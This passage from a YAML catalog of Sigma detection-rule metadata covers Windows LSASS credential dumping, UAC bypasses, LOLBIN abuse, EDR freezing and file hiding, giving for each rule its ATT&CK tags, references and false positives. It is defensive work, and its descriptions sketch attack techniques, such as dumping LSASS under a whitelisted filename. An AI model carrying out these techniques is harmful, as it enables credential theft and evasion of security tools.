  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1541920424635912196
  - https://github.com/elastic/detection-rules/blob/2bc1795f3d7bcc3946452eb4f07ae799a756d94e/rules/windows/credential_access_lsass_handle_via_malseclogon.toml
  - https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: a18dd26b-6450-46de-8c91-9659150cf088
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_susp_access_flag.yml
  name: Potentially Suspicious GrantedAccess Flags On LSASS
  description: Detects process access requests to LSASS process with potentially suspicious
    access flags
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow
  - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://web.archive.org/web/20230420013146/http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf
  false_positives:
  - Legitimate software such as AV and EDR
  notes: ''
- detection_id: e5b33f7d-eb93-48b6-9851-09e1e610b6d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_werfault.yml
  name: Credential Dumping Attempt Via WerFault
  description: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz,
    Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll
    or dbgcore.dll for win10, server2016 and up.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://github.com/helpsystems/nanodump/commit/578116faea3d278d53d70ea932e2bbfe42569507
  false_positives:
  - Actual failures in lsass.exe that trigger a crash dump (unlikely)
  - Unknown cases in which WerFault accesses lsass.exe
  notes: ''
- detection_id: 4be8b654-0c01-4c9d-a10c-6b28467fc651
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_whitelisted_process_names.yml
  name: LSASS Access From Potentially White-Listed Processes
  description: 'Detects a possible process memory dump that uses a white-listed filename
    like TrolleyExpress.exe as a way to dump the LSASS process memory without Microsoft
    Defender interference

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1491557187168178176
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
  - https://twitter.com/mrd0x/status/1460597833917251595
  false_positives:
  - Unknown
  notes: ''
- detection_id: a24e5861-c6ca-4fde-a93c-ba9256feddf0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_susp_all_access_uncommon_target.yml
  name: Uncommon Process Access Rights For Target Image
  description: 'Detects process access request to uncommon target images with a "PROCESS_ALL_ACCESS"
    access mask.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1055.011
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.011
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f5c1d59-33be-4e60-bcab-85d2f566effd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_susp_dbgcore_dbghelp_load.yml
  name: Suspicious Process Access to LSASS with Dbgcore/Dbghelp DLLs
  description: 'Detects suspicious process access to LSASS.exe from processes located
    in uncommon locations with dbgcore.dll or dbghelp.dll in the call trace.

    These DLLs contain functions like MiniDumpWriteDump that can be abused for credential
    dumping purposes. While modern tools like Mimikatz have moved to using ntdll.dll,

    dbgcore.dll and dbghelp.dll are still used by basic credential dumping utilities
    and legacy tools for LSASS memory access and process suspension techniques.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1562.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html
  - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpwritedump
  false_positives:
  - Possibly during software installation or update processes
  notes: ''
- detection_id: 3f3f3506-1895-401b-9cc3-e86b16e630d0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_susp_direct_ntopenprocess_call.yml
  name: Potential Direct Syscall of NtOpenProcess
  description: Detects potential calls to NtOpenProcess directly from NTDLL.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  tags:
  - attack.execution
  - attack.t1106
  time_window: ''
  references:
  - https://medium.com/falconforce/falconfriday-direct-system-calls-and-cobalt-strike-bofs-0xff14-741fa8e1bdd6
  false_positives:
  - Unknown
  notes: ''
- detection_id: 174afcfa-6e40-4ae9-af64-496546389294
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_svchost_credential_dumping.yml
  name: Credential Dumping Attempt Via Svchost
  description: Detects when a process tries to access the memory of svchost to potentially
    dump credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 166e9c50-8cd9-44af-815d-d1f0c0e90dde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_svchost_susp_access_request.yml
  name: Suspicious Svchost Process Access
  description: Detects suspicious access to the "svchost" process such as that used
    by Invoke-Phantom to kill the thread of the Windows event logging service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://github.com/hlldz/Invoke-Phant0m
  - https://twitter.com/timbmsft/status/900724491076214784
  false_positives:
  - Unknown
  notes: ''
- detection_id: fb3722e4-1a06-46b6-b772-253e2e7db933
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_uac_bypass_editionupgrademanagerobj.yml
  name: Function Call From Undocumented COM Interface EditionUpgradeManager
  description: Detects function calls from the EditionUpgradeManager COM interface.
    Which is an interface that is not used by standard executables.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://www.snip2code.com/Snippet/4397378/UAC-bypass-using-EditionUpgradeManager-C/
  - https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f6c43e2-f989-4ea5-bcd8-843b49a0317c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_uac_bypass_wow64_logger.yml
  name: UAC Bypass Using WOW64 Logger DLL Hijack
  description: Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe
    30)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 387df17d-3b04-448f-8669-9e7fd5e5fd8c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_werfaultsecure_msmpeng_access.yml
  name: Suspicious Process Access of MsMpEng by WerFaultSecure - EDR-Freeze
  description: 'Detects process access events where WerFaultSecure accesses MsMpEng.exe
    with dbgcore.dll or dbghelp.dll in the call trace, indicating potential EDR freeze
    techniques.

    This technique leverages WerFaultSecure.exe running as a Protected Process Light
    (PPL) with WinTCB protection level to call MiniDumpWriteDump and suspend EDR/AV
    processes, allowing malicious activity to execute undetected during the suspension
    period.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://blog.axelarator.net/hunting-for-edr-freeze/
  false_positives:
  - Legitimate Windows Error Reporting operations
  notes: ''
- detection_id: ec570e53-4c76-45a9-804d-dc3f355ff7a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_7zip_exfil_dmp_files.yml
  name: 7Zip Compressing Dump Files
  description: Detects execution of 7z in order to compress a file with a ".dmp"/".dump"
    extension, which could be a step in a process of dump file exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Legitimate use of 7z with a command line in which ".dmp" or ".dump" appears accidentally
  - Legitimate use of 7z to compress WER ".dmp" files for troubleshooting
  notes: ''
- detection_id: 9fbf5927-5261-4284-a71d-f681029ea574
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_7zip_password_compression.yml
  name: Compress Data and Lock With Password for Exfiltration With 7-ZIP
  description: An adversary may compress or encrypt data that is collected prior to
    exfiltration using 3rd party utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  false_positives:
  - Legitimate activity is expected since compressing files with a password is common.
  notes: ''
- detection_id: 0f6da907-5854-4be6-859a-e9958747b0aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_acccheckconsole_execution.yml
  name: Potential DLL Injection Via AccCheckConsole
  description: 'Detects the execution "AccCheckConsole" a command-line tool for verifying
    the accessibility implementation of an application''s UI.

    One of the tests that this checker can run are called "verification routine",
    which tests for things like Consistency, Navigation, etc.

    The tool allows a user to provide a DLL that can contain a custom "verification
    routine". An attacker can build such DLLs and pass it via the CLI, which would
    then be loaded in the context of the "AccCheckConsole" utility.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340
  - https://twitter.com/bohops/status/1477717351017680899?s=12
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/AccCheckConsole/
  false_positives:
  - Legitimate use of the UI Accessibility Checker
  notes: ''
- detection_id: 631b22a4-70f4-4e2f-9ea8-42f84d9df6d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_addinutil_suspicious_cmdline.yml
  name: Suspicious AddinUtil.EXE CommandLine Execution
  description: 'Detects execution of the Add-In deployment cache updating utility
    (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary
    may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point
    to the adversaries Addins.Store payload.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b5746143-59d6-4603-8d06-acbd60e166ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_child_process.yml
  name: Uncommon Child Process Of AddinUtil.EXE
  description: 'Detects uncommon child processes of the Add-In deployment cache updating
    utility (AddInutil.exe) which could be a sign of potential abuse of the binary
    to proxy execution via a custom Addins.Store payload.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f2cd9b6-4a17-440f-bb2a-687abb65993a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_cmdline.yml
  name: Uncommon AddinUtil.EXE CommandLine Execution
  description: 'Detects execution of the Add-In deployment cache updating utility
    (AddInutil.exe) with uncommon Addinroot or Pipelineroot paths. An adversary may
    execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to
    the adversaries Addins.Store payload.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6120ac2a-a34b-42c0-a9bd-1fb9f459f348
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_dir_exec.yml
  name: AddinUtil.EXE Execution From Uncommon Directory
  description: Detects execution of the Add-In deployment cache updating utility (AddInutil.exe)
    from a non-standard directory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f869d59-7f6a-4931-992c-cce556ff2d53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_adplus_memory_dump.yml
  name: Potential Adplus.EXE Abuse
  description: Detects execution of "AdPlus.exe", a binary that is part of the Windows
    SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary
    commands.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1003.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/
  - https://twitter.com/nas_bench/status/1534916659676422152
  - https://twitter.com/nas_bench/status/1534915321856917506
  false_positives:
  - Legitimate usage of Adplus for debugging purposes
  notes: ''
- detection_id: 7efd2c8d-8b18-45b7-947d-adfe9ed04f61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_agentexecutor_potential_abuse.yml
  name: AgentExecutor PowerShell Execution
  description: Detects execution of the AgentExecutor.exe binary. Which can be abused
    as a LOLBIN to execute powershell scripts with the ExecutionPolicy "Bypass" or
    any binary named "powershell.exe" located in the path provided by 6th positional
    argument
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/lefterispan/status/1286259016436514816
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/
  - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension
  - https://twitter.com/jseerden/status/1247985304667066373/photo/1
  false_positives:
  - Legitimate use via Intune management. You exclude script paths and names to reduce
    FP rate
  notes: ''
- detection_id: c0b40568-b1e9-4b03-8d6c-b096da6da9ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_agentexecutor_susp_usage.yml
  name: Suspicious AgentExecutor PowerShell Execution
  description: Detects execution of the AgentExecutor.exe binary. Which can be abused
    as a LOLBIN to execute powershell scripts with the ExecutionPolicy "Bypass" or
    any binary named "powershell.exe" located in the path provided by 6th positional
    argument
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/lefterispan/status/1286259016436514816
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/
  - https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension
  - https://twitter.com/jseerden/status/1247985304667066373/photo/1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9c7e131a-0f2c-4ae0-9d43-b04f4e266d43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_appvlp_uncommon_child_process.yml
  name: Uncommon Child Process Of Appvlp.EXE
  description: 'Detects uncommon child processes of Appvlp.EXE

    Appvlp or the Application Virtualization Utility is included with Microsoft Office.
    Attackers are able to abuse "AppVLP" to execute shell commands.

    Normally, this binary is used for Application Virtualization, but it can also
    be abused to circumvent the ASR file path rule folder

    or to mark a file as a system file.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.t1218
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8e95e73e-ba02-4a87-b4d7-0929b8053038
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_arcsoc_susp_child_process.yml
  name: Suspicious ArcSOC.exe Child Process
  description: 'Detects script interpreters, command-line tools, and similar suspicious
    child processes of ArcSOC.exe.

    ArcSOC.exe is the process name which hosts ArcGIS Server REST services. If an
    attacker compromises an ArcGIS

    Server system and uploads a malicious Server Object Extension (SOE), they can
    send crafted requests to the corresponding

    service endpoint and remotely execute code from the ArcSOC.exe process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1203
  tags:
  - attack.execution
  - attack.t1059
  - attack.t1203
  time_window: ''
  references:
  - https://reliaquest.com/blog/threat-spotlight-inside-flax-typhoons-arcgis-compromise/
  - https://enterprise.arcgis.com/en/server/12.0/administer/windows/inside-an-arcgis-server-site.htm
  false_positives:
  - Unknown
  notes: ''
- detection_id: a01b8329-5953-4f73-ae2d-aa01e1f35f00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_aspnet_compiler_exectuion.yml
  name: AspNetCompiler Execution
  description: Detects execution of "aspnet_compiler.exe" which can be abused to compile
    and execute C# code.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
  - https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9ccba514-7cb6-4c5c-b377-700758f2f120
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_aspnet_compiler_susp_child_process.yml
  name: Suspicious Child Process of AspNetCompiler
  description: Detects potentially suspicious child processes of "aspnet_compiler.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
  - https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f50fe98-fe5c-4a2d-86c7-fad7f63ed622
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_aspnet_compiler_susp_paths.yml
  name: Potentially Suspicious ASP.NET Compilation Via AspNetCompiler
  description: Detects execution of "aspnet_compiler.exe" with potentially suspicious
    paths for compilation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
  - https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60fc936d-2eb0-4543-8a13-911c750a1dfc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_at_interactive_execution.yml
  name: Interactive AT Job
  description: Detects an interactive AT job, which may be used as a form of privilege
    escalation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1053.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md
  - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html
  false_positives:
  - Unlikely (at.exe deprecated as of Windows 8)
  notes: ''
- detection_id: f24bcaea-0cd1-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_atbroker_uncommon_ats_execution.yml
  name: Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE
  description: Detects the start of a non built-in assistive technology applications
    via "Atbroker.EXE".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
  - https://lolbas-project.github.io/lolbas/Binaries/Atbroker/
  false_positives:
  - Legitimate, non-default assistive technology applications execution
  notes: ''
- detection_id: 4281cb20-2994-4580-aa63-c8b86d019934
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml
  name: Hiding Files with Attrib.exe
  description: Detects usage of attrib.exe to hide files from users.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/
  - https://www.uptycs.com/blog/lolbins-are-no-laughing-matter
  false_positives:
  - IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe
    and igfxCUIService.exe is the parent of the cmd.exe)
  - Msiexec.exe hiding desktop.ini
  notes: ''
- detection_id: efec536f-72e8-4656-8960-5e85d091345b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_attrib_system_susp_paths.yml
  name: Set Suspicious Files as System Files Using Attrib.EXE
  description: 'Detects the usage of attrib with the "+s" option to set scripts or
    executables located in suspicious locations as system files to hide them from
    users and make them unable to be deleted with simple rights. The rule limits the
    search to specific extensions and directories to avoid FPs

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://app.any.run/tasks/c28cabc8-a19f-40f3-a78b-cae506a5c0d4
  - https://app.any.run/tasks/cfc8870b-ccd7-4210-88cf-a8087476a6d0
  - https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e
  source_id: sigmahq_sigma
